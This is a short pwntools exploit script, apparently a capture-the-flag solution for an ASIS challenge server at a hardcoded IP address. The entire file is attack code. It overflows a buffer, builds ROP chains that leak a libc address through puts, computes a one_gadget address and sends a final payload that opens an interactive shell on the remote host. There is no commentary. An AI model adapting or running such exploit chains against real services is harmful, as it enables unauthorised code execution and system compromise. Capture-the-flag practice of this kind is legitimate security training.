#!/usr/bin/python
from pwn import *

host = '37.139.17.37'
port = 1338

r = remote(host, port)

context.arch = 'amd64'

buf = 0x603000

write_plt = 0x400890
puts_plt = 0x0000000000400880
read_plt = 0x4008e0
puts_got = 0x0000000000602028

pop_rsi_r15 = 0x0000000000400cf1
pop_rdi = 0x0000000000400cf3

main_read = 0x400bb7
main_exit = 0x400c31

puts_base = 0x00000000000809c0
pop_rdx = 0x0000000000001b96
one_gadget = 0x4f322

r.recvuntil(':')
payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
payload += flat([buf-0x200, pop_rdi, puts_got, puts_plt, main_read])
r.sendline(payload)
r.recvuntil('Yeah tha')
libc = u64(r.recvn(6).ljust(8, '\x00')) - puts_base
print ('libc : ', hex(libc))
pop_rdx += libc
print ('pop_rdx : ', hex(pop_rdx))
one_gadget += libc
print ('one_gadget : ', hex(one_gadget))


time.sleep(1)
payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
payload += flat([buf-0x400, pop_rdi, 0, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, read_plt, pop_rdi, 10, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, write_plt, main_exit])
r.sendline(payload)

time.sleep(1)
payload = 'TRANSMISSION_OVER\x00'.ljust(0x28, 'a')
payload += flat([one_gadget])
r.sendline(payload)
r.interactive()
